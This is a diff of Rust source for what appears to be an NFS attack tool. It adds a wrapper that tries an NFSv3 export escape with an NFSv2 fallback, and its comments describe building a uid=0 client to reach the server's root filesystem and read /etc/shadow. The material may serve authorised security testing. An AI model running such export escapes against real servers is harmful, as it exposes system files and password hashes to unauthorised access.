@@ -162,16 +162,22 @@ async fn run_inner(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: 
     Ok(())
 }
 
-/// Shared export-escape primitive behind both `escape` and `scan --auto-escape`.
+/// Try NFSv3 escape first, then NFSv2 fallback. Returns just the outcome
+/// (no client). Used by `scan --auto-escape` which doesn't need the client
+/// for post-escape reads.
+pub(crate) async fn find_escape_any(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: u32, globals: &GlobalOpts, announce: bool) -> anyhow::Result<EscapeOutcome> {
+    match find_escape(host, export, btrfs_subvols, max_root_scan, globals, announce).await {
+        Ok((_client, outcome)) => Ok(outcome),
+        Err(_) => find_escape_v2(host, export, max_root_scan, globals).await,
+    }
+}
+
+/// NFSv3 export-escape primitive.
 ///
 /// Mounts `host:export`, builds a uid=0 probe client, and searches for a working
-/// filesystem-root handle (BTRFS subvolumes, then ext4/XFS known inodes, then a
+/// filesystem-root handle (ext4/XFS known inodes first, then BTRFS subvolumes, then a
 /// fallback inode scan). Returns the probe client -- so the caller can perform
 /// post-escape reads such as /etc/shadow -- together with the [`EscapeOutcome`].
-///
-/// uid=0 keeps permission errors (squashed root) distinguishable from format
-/// errors (STALE/BADHANDLE); the handle is a bearer token, so any later
-/// credential works with it (RFC 1094 S2.3.3).
 ///
 /// Per-candidate progress lines are written to stderr only when `announce` is
 /// set. Bulk callers (`scan --auto-escape`) pass `false` and print their own
